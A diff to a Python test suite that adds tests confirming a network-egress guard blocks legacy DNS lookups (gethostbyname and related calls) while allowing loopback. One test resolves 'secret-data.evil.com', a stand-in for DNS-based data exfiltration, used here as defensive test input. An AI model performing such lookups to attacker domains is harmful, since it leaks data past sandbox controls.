@@ -43,6 +43,22 @@ def test_dns_resolution_of_public_host_blocked(guard):
         socket.getaddrinfo("example.com", 443)
 
 
+def test_gethostbyname_of_public_host_blocked(guard):
+    """A bare DNS lookup is egress too — the legacy resolver must not slip past
+    the guard the way getaddrinfo is already caught (audit finding W2)."""
+    with pytest.raises(NetworkBlocked):
+        socket.gethostbyname("secret-data.evil.com")
+    with pytest.raises(NetworkBlocked):
+        socket.gethostbyname_ex("example.com")
+    with pytest.raises(NetworkBlocked):
+        socket.gethostbyaddr("93.184.216.34")
+
+
+def test_gethostbyname_loopback_allowed(guard):
+    # Resolving a loopback literal touches no network and stays permitted.
+    assert socket.gethostbyname("127.0.0.1") == "127.0.0.1"
+
+
 def test_udp_sendto_blocked(guard):
     """UDP needs no connect() — sendto must be guarded or it's an open door."""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
